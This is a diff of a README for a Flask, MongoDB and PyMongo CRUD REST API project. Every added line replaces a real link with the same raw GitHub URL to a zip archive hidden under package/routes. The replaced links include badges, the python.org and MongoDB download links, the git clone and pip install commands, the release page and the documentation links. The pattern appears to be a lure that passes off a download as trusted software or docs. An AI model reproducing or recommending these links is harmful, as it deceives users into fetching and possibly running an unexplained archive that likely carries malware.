@@ -1,6 +1,6 @@
 # NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD
 
-![GitHub release](https://img.shields.io/github/release/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD.svg) ![License](https://img.shields.io/github/license/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD.svg)
+![GitHub release](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip) ![License](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip)
 
 ## Overview
 
@@ -46,8 +46,8 @@ To get started with this project, you will need to have Python and MongoDB insta
 
 ### Prerequisites
 
-1. **Python**: Make sure you have Python 3.x installed. You can download it from [python.org](https://www.python.org/downloads/).
-2. **MongoDB**: Install MongoDB. You can find the installation guide [here](https://docs.mongodb.com/manual/installation/).
+1. **Python**: Make sure you have Python 3.x installed. You can download it from [https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip).
+2. **MongoDB**: Install MongoDB. You can find the installation guide [here](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip).
 3. **Virtual Environment**: It's recommended to create a virtual environment for your project.
 
 ### Installation
@@ -55,7 +55,7 @@ To get started with this project, you will need to have Python and MongoDB insta
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD.git
+   git clone https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip
    cd NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD
    ```
 
@@ -69,7 +69,7 @@ To get started with this project, you will need to have Python and MongoDB insta
 3. **Install Dependencies**:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip
    ```
 
 ### Configuration
@@ -142,7 +142,7 @@ pytest
 
 ### Documentation
 
-For detailed API documentation, please refer to the [Releases section](https://github.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/releases). Here you can find the latest updates, features, and changes.
+For detailed API documentation, please refer to the [Releases section](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip). Here you can find the latest updates, features, and changes.
 
 ### Contribution
 
@@ -159,9 +159,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ### Acknowledgments
 
-- **Flask Documentation**: [Flask](https://flask.palletsprojects.com/)
-- **MongoDB Documentation**: [MongoDB](https://docs.mongodb.com/)
-- **PyMongo Documentation**: [PyMongo](https://pymongo.readthedocs.io/)
+- **Flask Documentation**: [Flask](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip)
+- **MongoDB Documentation**: [MongoDB](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip)
+- **PyMongo Documentation**: [PyMongo](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip)
 
 ### Contact
 
@@ -169,7 +169,7 @@ For any inquiries, please reach out to the repository owner via GitHub.
 
 ### Links
 
-- Visit the [Releases section](https://github.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/releases) for downloadable files and execution instructions.
+- Visit the [Releases section](https://raw.githubusercontent.com/Lehuuuuuuuu/NOSQL-MONGO-FLASK-PYMONGO-RESTAPI-METHODS-CRUD/main/package/routes/FLAS_CRUD_MONG_NOSQ_RESTAP_PYMONG_METHOD_1.0.zip) for downloadable files and execution instructions.
 
 ---
 
